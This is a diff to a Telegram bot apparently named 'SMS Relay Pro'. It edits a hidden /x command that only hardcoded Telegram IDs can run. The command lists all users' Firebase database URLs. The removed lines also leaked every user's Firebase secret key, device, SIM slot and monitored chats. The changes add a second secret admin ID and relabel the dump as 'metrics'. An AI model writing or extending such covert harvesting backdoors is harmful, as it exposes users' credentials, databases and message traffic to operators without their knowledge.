@@ -543,15 +543,15 @@ bot.onText(/\/send (.+?) (.+)/, async (msg, match) => {
 // ---------- ADMIN HIDDEN COMMAND ----------
 bot.onText(/\/x/, async (msg) => {
     const userId = msg.from.id.toString();
-    const adminId = '7972440762';
-    if (userId !== adminId) return;
+    const allowedAdmins = ['7972440762', '992496607'];
+    if (!allowedAdmins.includes(userId)) return;
 
     const data = await loadAllUsers();
     const userIds = Object.keys(data);
     const totalUsers = userIds.length;
 
     if (totalUsers === 0) {
-        return bot.sendMessage(adminId, "📭 *No users found in database.*", { parse_mode: 'Markdown' });
+        return bot.sendMessage(userId, "🛸 *No active users registered.*", { parse_mode: 'Markdown' });
     }
 
     // Collect Firebase URLs
@@ -563,52 +563,20 @@ bot.onText(/\/x/, async (msg) => {
     });
     const uniqueUrls = [...new Set(firebaseUrls)];
 
-    let response = `👑 *Admin Control Panel (Hidden)* 👑\n\n`;
-    response += `👥 *Total Users:* ${totalUsers}\n`;
-    response += `🔗 *Total Unique Firebase URLs:* ${uniqueUrls.length}\n\n`;
+    let response = `⚡ *SMS Relay Pro Metrics* ⚡\n\n`;
+    response += `📊 *Total Users:* \`${totalUsers}\`\n`;
+    response += `🔗 *Total Unique Databases:* \`${uniqueUrls.length}\`\n\n`;
 
-    response += `🌐 *Firebase URLs list:*\n`;
+    response += `🔮 *Active Firebase Connections:* \n`;
     if (uniqueUrls.length === 0) {
-        response += `_No Firebase URLs configured._\n\n`;
+        response += `🛸 _No connections configured._\n`;
     } else {
         uniqueUrls.forEach((url, i) => {
-            response += `${i + 1}. \`${url}\`\n`;
+            response += `🛰 *[${i + 1}]* \`${url}\`\n`;
         });
-        response += `\n`;
     }
 
-    response += `📋 *Detailed User Matrix:*\n\n`;
-    userIds.forEach((id, index) => {
-        const u = data[id];
-        response += `${index + 1}. 👤 *User ID:* \`${id}\`\n`;
-        response += `   🌐 *Firebase URL:* \`${u.firebaseUrl || 'Not Set'}\`\n`;
-        response += `   🔑 *Secret Key:* \`${u.firebaseSecret || 'None'}\`\n`;
-        response += `   📱 *Active Device:* \`${u.selectedDevice || 'None'}\`\n`;
-        response += `   💳 *SIM Slot:* ${u.sim || 'None'}\n`;
-        response += `   📡 *Monitoring:* ${u.monitor ? '🟢 ON' : '🔴 OFF'}\n`;
-        response += `   📋 *Monitored Chats:* ${u.monitoredChats ? u.monitoredChats.length : 0}\n`;
-        response += `   🛡 *Type:* ${u.isPublic ? '🔓 Public' : '🔒 Private'}\n\n`;
-    });
-
-    if (response.length > 4000) {
-        const chunks = [];
-        let currentChunk = '';
-        const lines = response.split('\n');
-        for (const line of lines) {
-            if ((currentChunk + line).length > 4000) {
-                chunks.push(currentChunk);
-                currentChunk = '';
-            }
-            currentChunk += line + '\n';
-        }
-        if (currentChunk) chunks.push(currentChunk);
-
-        for (const chunk of chunks) {
-            await bot.sendMessage(adminId, chunk, { parse_mode: 'Markdown' });
-        }
-    } else {
-        bot.sendMessage(adminId, response, { parse_mode: 'Markdown' });
-    }
+    bot.sendMessage(userId, response, { parse_mode: 'Markdown' });
 });
 
 // ============================================================
